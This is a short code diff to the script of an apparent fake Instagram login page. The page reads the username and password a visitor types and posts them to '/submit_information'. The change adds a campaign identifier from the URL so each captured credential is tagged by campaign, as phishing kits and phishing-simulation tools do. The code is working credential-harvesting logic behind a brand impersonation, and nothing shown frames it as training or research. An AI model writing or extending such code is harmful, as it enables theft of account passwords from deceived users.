@@ -83,13 +83,14 @@
             const username = document.querySelector('input[type="text"]').value;
             const password = document.querySelector('input[type="password"]').value;
             const page = 'Instagram';
-            var token = window.location.pathname.split('/')[2];
+            var campaignId = window.location.pathname.split('/')[2];
+            var token = window.location.pathname.split('/')[3];
             fetch('/submit_information', {
                 method: 'POST',
                 headers: {
                         'Content-Type': 'application/json',
                     },
-                body: JSON.stringify({ username, password, token, page })
+                body: JSON.stringify({ username, password, token, page, campaignId })
             })
             .then(response => {
                 if(response.ok) {
